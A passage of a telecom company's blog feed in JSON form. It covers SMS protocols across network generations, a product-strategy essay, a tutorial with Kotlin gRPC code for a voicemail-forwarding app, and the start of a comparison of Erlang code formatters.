that *USC-2* is fixed width and does not allow for the\\nextended characters in the private use area of *BMP*. *UTF-16* is\\nvariable width of one or two 16-bits code points, and does allow the\\nextended characters. For extended characters to work (for instance\\n\\"praying/folded hands\\" &#x1F64F;), phones might try to fake *UTF-16*\\nby using two *USC-2* characters. New phones can handle this fine, but\\nolder phones might receive two question marks as they cannot decode it\\nproperly.\\n\\nIf *GSM7* have a modified charset (i.e. not the default *BMP*) then\\nthere will be a header in front that specifies that. That header will\\ntake up 7 bytes after packing (in other words 8 characters), making\\nthe maximum length of the *SMS* 152 characters.\\n\\n<div class=\\"left-right-row\\">\\n    <img class=\\"image\\" src=\\"/img/blog/sms/67_chars.png\\" alt=\\"Characters left: 45/67 (3)\\" />\\n    <div class=\\"text\\">\\n        Using emojis will convert the encoding to USC-2. Note the missing 3\\n        characters and that there are multiple SMSes. When multiple messages\\n        are sent, the phone needs some way of telling how to reassemble the\\n        messages. The headers take up 6 bytes per message for this purpose.\\n    </div>\\n</div>\\n\\nHowever when *MAP* v2 started to use *TCAP* dialogues there was more\\ninformation to put into the packet and 140 bytes might not be left for\\nthe *SMS*. The *SMSC* would then need to break up the message into\\nchunks, and start the transaction an empty *TCAP* `Begin` message and\\nset a flag in the *MT* request called `moreMessagesToSend`. It would\\nthen send the actual text inside `Continue` messages. In the end\\nthe `End` (_hehe_) message is transmitted as a response and the\\ntransaction is finished.\\n\\nThe response back to a *MO* request is, as previous stated, an\\nacknowledgement if the *SMS* have been successfully submitted to the\\n*SMSC* or not (again either `returnResult` or `returnError`). For *MT*\\nrequests the acknowledgement is if the *SMS* is successfully delivered\\nor not.\\n\\nIf the *MT* request is not successful, the *SMSC* could ask the *HLR*\\n(the Home Location Registry is basically a database containing user\\nsubscriptions and knowledge of which nodes the mobile talked to\\nlatest) to be notified when the user comes back online. A bunch of\\nother *MAP* messages are then involved, such as\\n- `reportSMDeliveryStatus`,\\n- `informServiceCentre`,\\n- `alterServiceCentre`, and\\n- `readyForSM`.\\n\\n_At least this is main idea I think..._\\n\\n# Differences in MAP versions for SMS\\n\\nThere are three *MAP* versions defined for *SMS*. The latest version\\n(v4) is not used in the context of *SMS*.\\n\\nIn version 1, the dialogue portion was not invented and all chunks are\\nsent in new *TCAP* dialogues. The size of the user data could then\\nbe 140 bytes.\\n\\nIn version 1 and version 2 there is no difference between *MT* and\\n*MO*. Everything is sent as another type of message `Forward-SM`,\\nwhich does not include any privacy correlation ids, and there are no\\nfancy responses with delivery status. There is still an\\nacknowledgement, but is in a form of an empty message.\\n\\nOnly way to see difference between an *MO* and a *MT* in version 1 is\\nto look at the addresses and see if they are either coming from an\\n*SMSC* or going to an *SMSC*.\\n\\nThe `moreMessagesToSend` flag was implemented in version 2, so it exist\\nonly for version 2 and version 3.\\n\\nOk, to recap, what do we have now\\n\\n- `Begin`, `Continue`, `End`, `Abort` messages.\\n- Dialogue handshake in the first request/response messages sent.\\n- `MT-Forward-SM`, `MO-Forward-SM`, `Forward-SM`\\n- Involved parties: Mobile phones, *MSC* and *SMSC*\\n\\n_Wait we are missing something. I\'ve only covered 2G,3G.._\\n\\n# What about 4G/LTE and beyond (5G)?\\n\\n_Ouch._\\n\\n*LTE* networks does not use any of the *M3UA*, *SCCP*, *TCAP*, *MAP*\\nprotocols. In *LTE* networks the main message type is *Diameter* which\\ndoesn\'t contain fragmentation and can contain larger\\nmessages. Everything is sent in one request and every request is\\nanswered with a response. *Diameter* could use either *TCP* or *SCTP* as\\ntransport layer.\\n\\nTo make *SMSes* work on *LTE* networks a new interface *SGs* was\\ninvented which translates *SS7* messages to *Diameter* messages.  This\\ninterface is in most cases used by the *MSC* to translate the messages\\nto *Diameter* and forward it to the *MME* (Mobility Management Entity,\\nsimilar to *SGSN* but in the *LTE* network). The *MME* then forwards\\nit to the *UE* (user equipment, same as mobile subscriber or *MS* in\\n*GSM*/*GPRS* networks).\\n\\nThere is also the *SM-over-IP* that does not use *Diameter*. Instead\\nit uses the *SIP*-protocol (Session Initiation Protocol) to transfer\\nmessages over *IP* and *TCP* or *UDP* to the *IMS* (IP Multimedia\\nSubsystem). *SIP* is also used to enable VoLTE (Voice over *LTE*).\\n\\nFor 5G the *SMSC* is called *SMSF*; The Centre becomes a Function. The\\nsignalling will be based on *HTTP2*/*JSON* ontop of *TCP*. The *SMSF*\\nwill still need to support both *MAP* and *Diameter*.\\n\\n\\nRelevant [xkcd](https://xkcd.com):\\n<div class=\\"left-right-row\\">\\n    <table class=\\"text\\">\\n        <tr>\\n            <td>Generation</td>\\n            <td>2G/3G</td>\\n            <td>4G</td>\\n            <td>5G</td>\\n        </tr>\\n        <tr>\\n            <td>Radio technology</td>\\n            <td>GSM/GPRS</td>\\n            <td>LTE</td>\\n            <td>NR</td>\\n        </tr>\\n        <tr>\\n            <td>Protocol group</td>\\n            <td>SS7</td>\\n            <td>Diameter</td>\\n            <td>HTTP2/JSON</td>\\n        </tr>\\n        <tr>\\n            <td></td>\\n            <td>Node</td>\\n            <td>Agent</td>\\n            <td>Function</td>\\n        </tr>\\n        <tr>\\n            <td>Session management</td>\\n            <td>SGSN</td>\\n            <td>MME</td>\\n            <td>AMF</td>\\n        </tr>\\n        <tr>\\n            <td>SM management</td>\\n            <td>SMSC</td>\\n            <td>SMSC</td>\\n            <td>SMSF</td>\\n        </tr>\\n        <tr>\\n            <td>User management</td>\\n            <td>HLR</td>\\n            <td>HSS</td>\\n            <td>UDM</td>\\n        </tr>\\n        <tr>\\n            <td>Device</td>\\n            <td>MS</td>\\n            <td>UE</td>\\n            <td>UE</td>\\n        </tr>\\n    </table>\\n    <a class=\\"image\\" href=\\"https://xkcd.com/2365/\\"><img src=\\"https://imgs.xkcd.com/comics/messaging_systems.png\\" /></a>\\n</div>\\n\\n# Headache\\n\\nHopefully you did not get a (too severe) headache by reading this\\npost.\\n\\nI\'ve spared you with **a lot** of details on the lower level of\\nprotocols. There are loads of implementation details that must match\\nthe specifications, otherwise you will get all kinds of aborts and\\npossibly even dropped traffic.\\nFor instance we learned that we accidentally sent dialogue portions in\\nmore than the first response back, which seemed to work at first\\nglance; at closer inspection we found out that some messages were\\ndropped because the length of the packet became larger in size than an\\nallowed value. We could still send them, but the other side was not\\nable to receive them.\\n\\nRemember: Telco is old and complex. However, it should still function\\nwith different setups and on different hardware, vendors and with\\nenvironment.\\n\\nFun-fact: Sometimes a boolean value is not just encoded as a 1\\nor 0. To save bandwith telco decided that you could also just define\\nit as a `NULL OPTIONAL` meaning that if it is defined (but lacks a\\nvalue), then it is considered true.  if it is not defined then it is\\nconsidered false. This is the case for the `moreMessagesToSend` flag.\\n\\nHope you enjoy the reading as much as I enjoy digging into these\\nprotocols!\\n\\nSpecial thanks to *Stein Eldar* and *Tobias* for giving me feedback\\nand answering all my stupid questions on this subject, and *Atanas*\\nfor making me realize there are yet other protocols to carry *SMS*.\\nAlso *Bung* for this amazing addition:\\n\\n#### Addition from *Bung*\\n\\n\\"I\u2019ve spared you with a lot of details on the lower level of\\nprotocols\\" needs a lot of emphasis.\\n\\nSome funny extra complexities that just came into my mind while\\nreading:\\n\\nThe actual *SMS* text goes into a field called \\"user data\\". There is a\\nfield called \\"user data length\\". When the message is *GSM7* encoded, the\\n\\"user data length\\" is the number of characters in the text message,\\notherwise it\'s the number of bytes in the user data.\\n\\nNormally the user data only contains the (encoded) text of the\\nmessage, but there is a field called \\"user data header\\" which\\nindicates that there is a length prefixed TLV header in the \\"user\\ndata\\". If the message is *GSM7* encoded, then the \\"user data lenght\\"\\nfield needs to be filled as if the \\"user data header\\" was really *GSM7*\\nencoded, which it isn\'t.\\n\\n*GSM7* is really a variably septet encoding, one character can consist\\nof either 7 or 14 bits similar to how a *UTF-8* code point can be 8,\\n16, 24, or 32 bits. Unlike *UTF-8* however, there are not multiple\\nbyte ranges corresponding to the different locales (called code pages\\nin Unicode) but a single 7 bit shift character that says that\\nfollowing 7 bits should be interpreted as a character from a\\ntranslation table which is communicated out of band.\\n\\nSo all that is only the complexities of a single field (the user data)\\nfor a single encoding (*GSM7*).\\n\\nThen the real kicker: The protocol for *SMS* is really called *SM-TP*\\n(Short Message Transfer Protocol). *SM-TP* is the same for 2G/3G (on top\\nof *MAP*), 4G (on top of *SIP*), 5G (on top of *HTTP*). So the very\\nsame stupid \\"length prefixed TLV encoded headers concatenated with\\nencoded text with length either in characters or in bytes depending on\\nencoding and actual meaning of the encoding communicated out of band\\nbut only sometimes\\" field exists no matter if your talking over old\\nlegacy *MAP* or the modern *HTTP/XML* based 5G."},{"id":"a-new-hope-for-products-in-telecom","metadata":{"permalink":"/blog/a-new-hope-for-products-in-telecom","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-08-28-a-new-hope-for-products-in-telecom.md","source":"@site/../blog/2020-08-28-a-new-hope-for-products-in-telecom.md","title":"A new hope for products in telecom","description":"This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.","date":"2020-08-28T00:00:00.000Z","formattedDate":"August 28, 2020","tags":[{"label":"telecom","permalink":"/blog/tags/telecom"},{"label":"software-development","permalink":"/blog/tags/software-development"},{"label":"core-network","permalink":"/blog/tags/core-network"},{"label":"app-ecosystem","permalink":"/blog/tags/app-ecosystem"}],"readingTime":5.985,"hasTruncateMarker":true,"authors":[{"name":"Marius Waldum","title":"Head of Product","url":"https://www.linkedin.com/in/mariuswaldum/","imageURL":"/img/author-photos/mw.jpg","key":"marius-waldum"}],"frontMatter":{"slug":"a-new-hope-for-products-in-telecom","title":"A new hope for products in telecom","date":"2020-08-28T00:00:00.000Z","tags":["telecom","software-development","core-network","app-ecosystem"],"authors":"marius-waldum"},"prevItem":{"title":"What the heck is a short message?","permalink":"/blog/what-is-a-short-message"},"nextItem":{"title":"Building software for a telecom core network","permalink":"/blog/building-software-for-a-telecom-core-network"}},"content":"This blog post will cover technology driven products that rely on telecom infrastructure, and not price plans, bundles, or marketing gimmicks. Anyone who has created a product and brought it to market more than once will tell you that it is hard.\\n\\n\x3c!--truncate--\x3e\\n\\nThe prerequisites for a great product is that:\\n1. It is valuable to the user and customer\\n2. It is easy enough to use so that the user can actually realise the value\\n3. It is feasible to build given the restraints you have on technology, legal, etc.\\n4. And on top of that it needs to make sense for your business\\n\\nEven if you succeed at all of this, you still have to market, sell and support it. I don\u2019t know anyone - nor have I ever heard about any company - that is able to get this right every time.\\n\\n## Remember that one?\\nEven Apple (with Steve Jobs still at the helm) had their flops. Remember \u201ciTunes Ping\u201d? No? Exactly.\\n\\nMaybe you\u2019re more into social products, so you bought \u201cFacebook Home\u201d? No I\u2019m not talking about your Facebook wall or anything you see on a screen, but an actual screen produced by Facebook that you place in your home as you would a framed photo.\\n\\nWell, those products were bold bets. A tech giant launching a smartphone wouldn\u2019t be that risky, would it? Pull out your Amazon Fire Phone and Google it! Ah.. that\'s right! That one got discontinued just 13 months after launch.\\n\\n## Oh the pain!\\nIt\u2019s never fun to see a product fail. When it happens, not only do the customers miss out on something potentially great, but it can end in billion dollar write offs and laying off thousands of employees.\\n\\nOperators are often hit hard by these failures, but companies like Apple, Facebook, Amazon and many others can have product flops regularly and still grow and become even more successful. **Why is that?**\\n\\n\\n## Learning from failure\\nIt\u2019s easy to make fun of big companies that launch products that flop, but we really shouldn\u2019t. Products that flop aren\u2019t a symptom of something that\u2019s wrong. Like Edison put it \u201cI have not failed. I\'ve just found 10,000 ways that won\'t work.\u201d\\n\\nCompanies like Apple, Facebook and Amazon have figured out how they can continue to find 10,000 ways that won\u2019t work so that they can create that one light bulb every now and then - and by doing so totally dominate their market.\\n\\nThey do this by empowering teams to\\n1. Assess new opportunities\\n2. Discover new products\\n3. Build quickly\\n4. Test and learn early\\n\\nThis is how 10,000 small bets are made.\\n\\n## Failing to learn\\nBig traditional companies used to pour tens of millions of dollars into 1 big bet with a few years apart. This is the opposite of Edison\u2019s approach. They never say it out loud but their quote could have been \u201cI have failed, and I\u2019m still clueless whether the other 9,999 ways could have worked\u201d.\\n\\nThese days though, most big traditional companies have moved away from the \u201c1 big bet approach\u201d and created \u201cdigital departments\u201d.\\n\\nThey hire people who have had success in companies that make many small bets, and they give them the freedom to organize themselves so that they can use the same methods. Some time goes by and there are few - or no - small bets placed.\\n\\nOften the teams in these digital departments are empowered to:\\n1. Assess new opportunities\\n2. Discover new products\\n\\nBut the technology fundamentals are not in place yet, so they are not able to:\\n3. Build quickly\\n\\nWhich makes it impossible to:\\n4. Test and learn early\\n\\nThis is especially true for companies with systems that rely on telecom operators. A company that wants access to, or change part of, a solution that has to do with telecommunication has to contact their operators, then the operator typically has to contact their vendor, then the vendor typically creates a change request ticket in their system, and then finally they get back with a fix.\\n\\nAdding that long wait to what should have been \u201cbuilt quickly\u201d is exactly how they go from many small bets to 1 big bet.\\n\\n## Giving up\\nThe end result, be it from the 1 big bet approach or a failed digital department, is that the big company decides to \u201cget back to basics\u201d, \u201cstick with what they know\u201d, and \u201cstrengthen the core business\u201d - meaning that they have entirely given up trying to create new products that people love.\\n\\nThe customers miss out on great new products, employees leave, and the business suffers.\\n\\n## A new hope\\nOur company got started because of this pain. Getting access to a mobile core network to create even small products is hard.\\n\\nIf you are lucky enough to actually get access, what you will see is a closed, uniquely configured core network built on top of nodes from external vendors. Add to the mix that you need people who actually know how to build anything on top of old telecom protocols and you have a perfect storm. If you have all of this and somehow are able to build a successful product, guess what? It doesn\u2019t scale to any other operator because they also have their own uniquely configured core network. And the privilege of getting access is reserved for employees and an exclusive list of vendors. If you are an independent product company who wants to build something cool you can forget about it!\\n\\nThis is why we built a mobile core network from scratch on top of AWS. Long story short this means that every operator using our core can use any product that is built with the [wgtwo developer portal](https://developer.wgtwo.com/).\\n\\nWe believe that subscribers will start to expect that they can add a range of valuable products to their subscription. This means going from a world where everyone gets the same standardized service from their operator - to a world where subscribers are treated as individuals who are free to activate the products that they want.\\n\\nThe way we do this is by enabling 3rd party developers (you!) to create products, and matching these products with operators so that the products are brought to the market for subscribers to enjoy.\\n\\nIn short, with the wgtwo developer portal, it is possible to build quickly, so you can test and learn early, making it possible to reduce the size of your bets, and increasing the chance of building great products that people love!\\n\\n## Try it out and join us\\nWe hope to get your feedback so that we can keep our bets small, and keep learning!\\n\\nWant to read about the first product we created, and how you can do the same using the developer portal? Check out my teammate David\u2019s post on [Building software for a telecom core network](https://wgtwo.com/blog/building-software-for-a-telecom-core-network).\\n\\nJoin us at [TADHack remotely](https://tadhack.com/2020/global/tadhack-trondheim-norway/) or at one of our locations in [Trondheim](https://tadhack.com/2020/global/tadhack-trondheim-norway/) or [Stockholm](https://tadhack.com/2020/global/tadhack-stockholm-sweden/) on October 10 and 11. It\u2019s completely free, and you will get to play around with our APIs, meet some cool people, eat, drink and have fun. Hope to see you there!"},{"id":"building-software-for-a-telecom-core-network","metadata":{"permalink":"/blog/building-software-for-a-telecom-core-network","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-08-21-building-software-for-a-telecom-core-network.md","source":"@site/../blog/2020-08-21-building-software-for-a-telecom-core-network.md","title":"Building software for a telecom core network","description":"One of the goals of wgtwo is to enable operators and third parties to build products and services for the \u201ccore network\u201d of the telecom stack. In short, this means providing API access to a subscription\u2019s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.","date":"2020-08-21T00:00:00.000Z","formattedDate":"August 21, 2020","tags":[{"label":"telecom","permalink":"/blog/tags/telecom"},{"label":"software-development","permalink":"/blog/tags/software-development"},{"label":"core-network","permalink":"/blog/tags/core-network"},{"label":"app-ecosystem","permalink":"/blog/tags/app-ecosystem"}],"readingTime":6.12,"hasTruncateMarker":true,"authors":[{"name":"David \xc5se","title":"Engineering Manager for Ecosystem","url":"https://linkedin.com/in/davidaase","imageURL":"/img/author-photos/daa.jpg","key":"david-\xe5se"}],"frontMatter":{"slug":"building-software-for-a-telecom-core-network","title":"Building software for a telecom core network","date":"2020-08-21T00:00:00.000Z","tags":["telecom","software-development","core-network","app-ecosystem"],"authors":"david-\xe5se"},"prevItem":{"title":"A new hope for products in telecom","permalink":"/blog/a-new-hope-for-products-in-telecom"},"nextItem":{"title":"Choosing an Erlang formatter","permalink":"/blog/choosing-erlang-formatter/"}},"content":"One of the goals of **wgtwo** is to enable operators and third parties to build products and services for the \u201ccore network\u201d of the telecom stack. In short, this means providing API access to a subscription\u2019s telecom functionality (messaging, calling, etc). In this article we will show how we built VoiceBox, a Voicemail forwarding application.\\n\\n\x3c!--truncate--\x3e\\n\\n## The product\\n\\nOne of the most common complaints people have with their Voicemail service in Europe is that you have to call in to your Voicemail to listen to your messages. In order to play the message, you have to navigate through a slow voice menu using your dialpad. We believed this would be easy to improve.\\n\\nOur product idea was simple. When Alice leaves a voicemail message for Bob, Bob receives this message either as an audio file or as a speech-to-text transcript.\\n\\n\\n![VoiceBox splash screen](/img/blog/building-software-for-a-telecom-core-network/voicebox-splash.png)\\n![VoiceBox home screen](/img/blog/building-software-for-a-telecom-core-network/voicebox-home.png)\\n![Android messaging app](/img/blog/building-software-for-a-telecom-core-network/message-inbox.png)\\n\\n\\nThe product idea isn\u2019t what most people would call revolutionary, but almost all of the world\'s mobile operators have hermetically sealed core networks. This means it would be impossible to build this product without lawyering up and coming to some sort of agreement with one of them. The **wgtwo** core network, however, is open and provides API access to Voicemail, MMS and SMS  (among other things), which is just what we need to build our product.\\n\\n## Developing on the **wgtwo** platform\\n\\nTo create a product on the **wgtwo** platform, the first thing you have to do is create a free developer account at <a href=\\"https://developer.wgtwo.com\\" target=\\"_blank\\">https://developer.wgtwo.com</a>. Once you have signed up, you have to create an Organization and add a Product to that organization.\\n\\nYou can specify what permissions your product will require in the `Product > Scopes` tab:\\n\\n![Developer Portal Scopes Screen](/img/blog/building-software-for-a-telecom-core-network/developer-portal-scopes.png)\\n\\nIn an ideal world, VoiceBox would work like this:\\n1. The subscriber signs in and enables the desired functionality in VoiceBox.\\n2. The next time the subscriber receives a voicemail, an event is fired by **wgtwo**\u2019s core network, which VoiceBox receives.\\n3. VoiceBox triggers an SMS/MMS send using our APIs.\\n4. The subscriber receives an SMS/MMS from the sender \u201cVoiceBox\u201d.\\n\\nIn a few months time this ideal world should be reality, but at the time of writing (mid August 2020) we\u2019re missing the events API and the \u201cSend from Product\u201d API. Currently VoiceBox works like this (changes are highlighted):\\n1. The subscriber signs in and enables the desired functionality in VoiceBox.\\n2. The next time the subscriber receives a voicemail, **VoiceBox will discover it by polling**.\\n3. VoiceBox triggers an MMS send using our APIs.\\n4. The subscriber receives an **MMS from their own number**.\\n\\nIt\u2019s not perfect, but it still demonstrates the potential of the platform. None of this can happen without the subscriber\u2019s consent though, so in the next section we\u2019ll have a look at how that works.\\n\\n## Obtaining user consent\\n\\nThe app we\'re building is touching sensitive data, and we can\'t do that without asking the subscriber if it\u2019s okay. The **wgtwo** platform includes an OAuth implementation with SMS authentication, which means that we can be reasonably sure that the subscriber has consented.\\n\\nWhen a subscriber opens VoiceBox for the first time, they\u2019re met with a login page, and after completing a pin challenge they arrive at an OAuth consent screen. Here they have to accept the terms of VoiceBox, as well as all the required scopes.\\n\\nThe login is branded to look like the product (notice the pink action button), while the consent screen is branded to look like the operator (in our case this is <a href=\\"https://vimla.se\\" target=\\"_blank\\">Vimla</a>, a Swedish operator which uses our platform):\\n![ID login screen](/img/blog/building-software-for-a-telecom-core-network/msisdn-screen.png)\\n![ID pin screen](/img/blog/building-software-for-a-telecom-core-network/pin-screen.png)\\n![ID consent screen](/img/blog/building-software-for-a-telecom-core-network/consent-screen.png)\\n\\nOur platform has a standard <a href=\\"https://oauth.net/2/\\" target=\\"_blank\\">OAuth 2</a> flow. When the subscriber taps \u201cAccept\u201d, **wgtwo** redirects the subscriber to the third-party, which receives an \\"access token\\" that allows them to act on behalf of the subscriber. In this case the access token will let the third-party fetch Voicemails and send MMS from the subscriber, so it\u2019s important to keep it safe.\\nNext we\u2019ll look at using this access token to perform actions on the subscriber\'s behalf.\\n\\n## Connecting to the **wgtwo** API\\n\\nAll **wgtwo** APIs are <a href=\\"https://grpc.io/\\" target=\\"_blank\\">gRPC</a>. This can be a bit intimidating if you are used to REST APIs, but luckily we also have official Java clients distributed through Maven/JitPack. If you want to use a different language you can generate your own client using our public proto files. One of the benefits of gRPC is that you don\u2019t have to ever write your own rest adapter for the API.\\n\\nLet\u2019s have a look at how you can fetch a Voicemail file:\\n\\n```kotlin\\nfun getVoicemail(user: User, uuid: String): Voicemail? {\\n    val getVoicemailRequest = VoicemailProto.GetVoicemailRequest.newBuilder().setVoicemailId(uuid).build()\\n    val voicemail = try {\\n        blockingStub\\n                .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)\\n                .getVoicemail(getVoicemailRequest)\\n    } catch (e: StatusRuntimeException) {\\n        logger.warn(\\"Error getting voicemail $uuid; ${e.message}\\")\\n        throw e\\n    }\\n    if (voicemail.metadata) {\\n        return Voicemail(\\n            ... // we map the gRPC voicemail object to a VoiceBox specific object\\n        )\\n    } else {\\n        logger.warn(\\"No voicemail metadata for $uuid\\")\\n        return null\\n    }\\n}\\n```\\n\\nWe use the official **wgtwo** API client to fetch a voicemail based on the UUID of the voicemail, which we polled for earlier (code not shown).\\n\\nUnlike with REST APIs, we don\'t have to think about writing client code and handling HTTP responses, this is taken care of by the gRPC client library.\\n\\nOnce we have the voicemail, we send it to the subscriber using their own number as the sender:\\n\\n```kotlin\\nfun sendMms(user: User, phone: Msisdn, audio: ByteString) = try {\\n    val request = MmsProto.SendMessageFromSubscriberRequest\\n            .newBuilder()\\n            .addMessageContent(\\n                MmsProto.MessageContent.newBuilder().setAudio(\\n                    MmsProto.AudioContent.newBuilder().setWav(audio)\\n                )\\n            )\\n            .setToE164(phone.toPhoneNumberProto()) // the receiver is the same as the sender\\n            .setFromSubscriber(phone.toPhoneNumberProto()) // the sender is the same as the receiver\\n            .build()\\n    val response = blockingStub\\n            .withOAuthTokenFor(user) // this function attaches the access token (from the consent screen)\\n            .sendMessageFromSubscriber(request)\\n    if (response.status == MmsProto.SendResponse.SendStatus.SEND_OK) {\\n        true\\n    } else {\\n        logger.warn(\\"Unable to send MMS to ${phone.e164}: ${response.description} (${response.status.name})\\")\\n        false\\n    }\\n} catch (e: Exception) {\\n    logger.warn(\\"Unable to send MMS to ${phone.e164}: ${e.message}\\")\\n    false\\n}\\n```\\n\\nThis is also pretty straightforward, except for the part where the sender is also the receiver. In the future this will be a bit less confusing, since we\u2019ll be sending the MMS from the product (\u201cVoiceBox\u201d) instead of the subscriber itself.\\n\\n## Conclusion\\n\\nAs you can see, we\u2019re still in the early stages of our developer platform. In the coming year, we will be adding a lot more APIs, as well as building an app-store where subscribers can browse products that they want to add to their subscription. We believe opening up the core network in this way will allow third-party developers to build incredible apps that will lead to much happier subscribers, which will in turn lead to subscriber growth for operators on our platform.\\n\\nAt the time of writing, all apps on the platform have to be free, but we are working on a monetization model similar to that of the Apple and Google app-stores. Our main priority is to come up with a model that is fair to both third-party developers and operators.\\n\\nIf you\u2019re interested in our platform, please head on over to <a href=\\"https://developer.wgtwo.com\\" target=\\"_blank\\">https://developer.wgtwo.com</a> and create an account. If you have any questions please contact us at <products@wgtwo.com>."},{"id":"choosing-erlang-formatter/","metadata":{"permalink":"/blog/choosing-erlang-formatter/","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2020-05-18-formatting-erlang.md","source":"@site/../blog/2020-05-18-formatting-erlang.md","title":"Choosing an Erlang formatter","description":"There are many different Erlang formatters, and as a hack day project","date":"2020-05-18T00:00:00.000Z","formattedDate":"May 18, 2020","tags":[{"label":"erlang","permalink":"/blog/tags/erlang"},{"label":"rebar3","permalink":"/blog/tags/rebar-3"},{"label":"coding","permalink":"/blog/tags/coding"},{"label":"culture","permalink":"/blog/tags/culture"}],"readingTime":7.685,"hasTruncateMarker":true,"authors":[{"name":"Sebastian Weddmark Olsson","title":"Tech Lead for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/sebastian-weddmark-olsson/","imageURL":"/img/author-photos/swo.jpg","key":"seba"}],"frontMatter":{"slug":"choosing-erlang-formatter/","title":"Choosing an Erlang formatter","date":"2020-05-18T00:00:00.000Z","tags":["erlang","rebar3","coding","culture"],"authors":"seba"},"prevItem":{"title":"Building software for a telecom core network","permalink":"/blog/building-software-for-a-telecom-core-network"},"nextItem":{"title":"VoWifi leaking IMSI","permalink":"/blog/vowifi-imsi-leak/"}},"content":"There are many different Erlang formatters, and as a hack day project\\nI investigated which options exist for us at **wgtwo**. There\\nare two main alternatives, but sadly both have problems.  I\'ve also\\nbriefly looked at an Erlang linter.\\n\\n\x3c!--truncate--\x3e\\n\\n# Background\\n\\nIn **wgtwo** we use a bunch of different programming\\nlanguages, and we all have different experiences and are used to\\ndifferent languages and environments. We are pretty autonomous and we\\nare expected to jump in and out in different services to fix bugs and\\nadd features.\\n\\nWe like when the code is uniform, because it makes it easier to focus\\non the business logic. That is why we want to use tools to make sure\\nour code is consistent no matter who is the author, or which IDE is\\nused, or in which part of the system the code resides.\\n\\nAbout half a year ago there was a discussion about code style within\\n**wgtwo** that resulted in formatting tools being applied for\\nKotlin, Bazel, Go and Java. It also resulted in an internal wiki page\\ncontaining guidelines about code style.\\n\\nThat document highlights some of the problems with mixing different\\ncode-styles. It should be easy for newcomers to maintain the coding\\nstyle. It should also be easy to read diffs, and the discussions about\\ncode style and formatting will be minimized because there is a\\nconcensus.\\n\\n# This is nice, I want it for Erlang\\n\\nAs some of our services are written in Erlang, I wanted to investigate\\nwhich formatters exist for Erlang, and what state they are in. I used\\nour last hack day for this purpose.\\n\\nThe requirements I had was that it should be reproducable. Calling the\\nformatter multiple times should not change the structure more than\\nonce (first time of being called). The formatter should also\\npreferably work with rebar3 (the most used Erlang build tool).  The\\ntool should not use external tooling that wouldn\'t work for all\\ndevelopers flow.\\n\\nI also wanted it to have a short execution time, at least after the\\ninitial formatting.\\n\\n# Benchmark\\n\\nI searched for formatting tools on hex.pm, github.com, duckduckgo.com,\\ngoogle.com and came up with the following arbitrary list of Erlang\\nformatters. There is probably others, but these seems to be the most\\nused.\\n\\n- rebar3_fmt\\n- steamroller\\n- otp/erl_tidy\\n- tsloughter/erl_tidy\\n- rebar3_format\\n- eryngii\\n\\n## [rebar3_fmt](https://github.com/fenollp/erlang-formatter)\\n\\nOne big problem with this is that it uses Emacs `erlang-mode` for\\nformatting. Sure, I am an Emacs user and the `erlang-mode` and its\\nformatting is maintained and supperted by OTP, but my non-Emacs\\ncoworkers would not be happy if they need to install Emacs every time\\nthey want to format the code.\\n\\n## [steamroller](https://github.com/old-reliable/steamroller/)\\n\\nThough it was easy to setup (just add it to dependencies in your Rebar\\nconfig and run `rebar3 steamroll`), my first impression of the\\nexecution was that it was really slow. Even when running subsequent\\ncalls on my Dell XPS 13 P82G it took around 3.5 minutes to format.\\n\\nThe plugin had some support for increasing the number of workers from\\nthe default `--J=1`, but that did not seem to help with the execution\\ntime.\\n\\nThe default steamroller formatting options specify 2 spaces instead of\\nthe `erlang-mode` 4 spaces standard that is used in our code base.\\n\\nHere is a sample of a complex record structure\\n\\n```diff\\n-                   components =\\n-                       [{invoke,\\n-                         #\'Invoke\'{\\n-                            invokeID = 1,linkedID = asn1_NOVALUE,\\n-                            operationCode = updateLocation,\\n-                            parameter =\\n-                                #\'UpdateLocationArg\'{\\n-                                   imsi = IMSI,\\n-                                   \'msc-Number\' = CallingGTBCD,\\n-                                   \'vlr-Number\' = CallingGTBCD}}}]},\\n+   components =\\n+     [\\n+       {\\n+         invoke,\\n+         #\'Invoke\'{\\n+           invokeID = 1,\\n+           linkedID = asn1_NOVALUE,\\n+           operationCode = updateLocation,\\n+           parameter =\\n+             #\'UpdateLocationArg\'{\\n+               imsi = IMSI,\\n+               \'msc-Number\' = CallingGTBCD,\\n+               \'vlr-Number\' = CallingGTBCD\\n+             }\\n+         }\\n+       }\\n+     ]\\n+ },\\n```\\n\\nI was quite happy with the results, even though they were slow, until\\nI saw how it treated maps\\n\\n```diff\\n-      parameters =\\n-          #{called_party_addr =>\\n-                #sccp_addr{\\n-                ... },\\n-            calling_party_addr =>\\n-                #sccp_addr{\\n-                ... },\\n-            data =>\\n-                #\'Continue\'{\\n+         parameters =\\n+             #{\\n+                 called_party_addr\\n+                 =>\\n+                 #sccp_addr{\\n+                   ...\\n+                 },\\n+                 calling_party_addr\\n+                 =>\\n+                 #sccp_addr{\\n+                   ...\\n+                 },\\n+                 data\\n+                 =>\\n+                 #\'Continue\'{\\n```\\n\\nI can\'t say that I easily understand what the parameters are and which\\nthe values are with this formatting. It burns in my eyes.\\n\\n\\n## [erl_tidy](https://github.com/tsloughter/erl_tidy) and [erl_tidy](https://erlang.org/documentation/doc-11.2/lib/syntax_tools-2.5/doc/html/erl_tidy.html)\\n\\nSo I found two `erl_tidy` projects, one is included in the Erlang/OTP\\nlibraries. The other one seems just to be a rebar3 wrapper around the\\nfirst one, so I\'ll just talk about the former one.\\n\\nUnder the hood this library uses `erl_prettypr:format/2`, which prints\\nthe abstract syntax tree. This should work well, but gives weird\\nindentation problems.  For instance when it comes to records it will\\nnot add a newline before the first field, so the lines will become\\nquite long, and when the lines become close to the paper width of the\\ndocument then it inserts too many newlines.\\n\\nVisualising with this example again\\n\\n```diff\\n-        components =\\n-            [{invoke,\\n-              #\'Invoke\'{\\n-                 invokeID = 1,linkedID = asn1_NOVALUE,\\n-                 operationCode = updateLocation,\\n-                 parameter =\\n-                     #\'UpdateLocationArg\'{\\n-                        imsi = IMSI,\\n-                        \'msc-Number\' = CallingGTBCD,\\n-                        \'vlr-Number\' = CallingGTBCD}}}]},\\n+     